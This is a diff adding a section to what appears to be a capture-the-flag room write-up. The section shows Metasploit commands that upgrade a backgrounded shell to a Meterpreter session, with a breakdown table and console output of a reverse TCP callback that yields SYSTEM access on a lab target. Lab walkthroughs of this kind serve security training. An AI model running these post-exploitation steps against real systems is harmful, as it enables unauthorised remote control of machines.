@@ -975,6 +975,48 @@ show options
 ==No answer needed==
 <div align="center">
 <br>
+<br>
+</div>
+
+**Commands**
+
+```
+sessions
+set SESSION 1
+set LHOST 192.168.134.39
+run
+```
+
+**Breakdown**
+
+|Component|Purpose|
+|---|---|
+|`sessions`|Lists active sessions to confirm the target shell's ID before setting it. Here the shell is session 1.|
+|`set SESSION 1`|Points the module at the backgrounded shell.|
+|`set LHOST 192.168.134.39`|Sets the callback to the `tun0` address, overriding the unreliable auto-detect.|
+|`run`|Executes. `exploit` is aliased.|
+
+**Result**
+
+```
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.134.39:4433
+[*] Post module execution completed
+[*] Sending stage (248902 bytes) to TARGET_IP
+[*] Meterpreter session 2 opened (192.168.134.39:4433 -> TARGET_IP:49915) at 2026-09-02 02:13:29 -0400
+[*] Stopping exploit/multi/handler
+```
+
+`Post module execution completed` prints before the session opens, and the console may need an Enter keypress before the new prompt shows — the module hands the callback to a separate handler that catches it a moment later. Running `run` twice opens a duplicate session; a spare Meterpreter session opened here and was removed with `sessions -k 3`. Session numbers are assigned dynamically and need not be sequential.
+
+The room's fallback note — re-run the previous task's exploit if this fails — applies because a converted session depends on the underlying shell still being healthy. If the shell has died, the conversion has nothing to push through.
+
+**What this gives you**
+
+**Key finding: a Meterpreter session opened as SYSTEM (session 2), running entirely in memory, while the original shell (session 1) remains as a fallback.** The 248,902-byte stage is the full Meterpreter agent, against the 336-byte raw shell.
+<div align="center">
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 <br>
